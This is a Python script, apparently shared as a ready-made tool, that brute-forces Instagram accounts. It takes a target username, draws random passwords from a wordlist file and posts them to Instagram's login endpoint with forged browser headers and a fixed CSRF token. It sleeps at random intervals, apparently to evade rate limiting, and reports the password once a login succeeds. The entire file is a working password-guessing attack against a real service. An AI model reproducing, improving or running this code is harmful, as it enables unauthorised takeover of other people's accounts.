
import requests
import random
import time


print("""

██╗░░░░░███╗░░░███╗  ██████╗░██████╗░██╗░░░██╗████████╗███████╗  ███████╗░█████╗░██████╗░░█████╗░███████╗
██║░░░░░████╗░████║  ██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░██╔████╔██║  ██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░  █████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░
██║░░░░░██║╚██╔╝██║  ██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░  ██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░
███████╗██║░╚═╝░██║  ██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗  ██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗
╚══════╝╚═╝░░░░░╚═╝  ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝

                      Developers : MOOMLE !!
                      HTTPS://TEXT.LMLOL.XYZ 
                      Instagram BRUTE FORCE!

        [+]███████████████████████████████████████████████████████████████████████████████████[+]

""")


def login():
    username = input("[+] Username : ")
    while True:
        passw = open('passw.txt', 'r').read().splitlines()
        password = random.choice(passw)
        
        timeslleep = random.randint(10, 30)
        
        headers = {
            'authority': 'www.instagram.com',
            'method': 'POST',
            'path': '/accounts/login/ajax/',
            'scheme': 'https',
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '322',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'missing',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
            'x-asbd-id': '437806',
            'x-csrftoken': 'j2TnjtUrcxtqqDqO888Crg5ceMqFnjok',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '8efffa255ae6-hot',
            'x-requested-with': 'XMLHttpRequest'
        }

        data = {
            'username': username,
            'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:' + password
        }

        time.sleep(timeslleep)
        request = requests.post('https://www.instagram.com/accounts/login/ajax/', headers=headers ,data=data).text
        print("[+] request : " + request,"\n""[+] chack password : " + password)
        print()

        if ('"authenticated":true')in request:
            print("""
                
█▄█ █▀▀ █▀   █░█ █▀▀   █ █▀   █▀▀ █ █▄░█ █▀▄   ▀█▀ █░█ █▀▀   █▀█ ▄▀█ █▀ █▀ █░█░█ █▀█ █▀█ █▀▄
░█░ ██▄ ▄█   █▀█ ██▄   █ ▄█   █▀░ █ █░▀█ █▄▀   ░█░ █▀█ ██▄   █▀▀ █▀█ ▄█ ▄█ ▀▄▀▄▀ █▄█ █▀▄ █▄▀
                """)
            print("[+] password : " + password)
            break
        
        if ('"status":"fail"') in request:
            print("[+] time out : " + password)

login()    
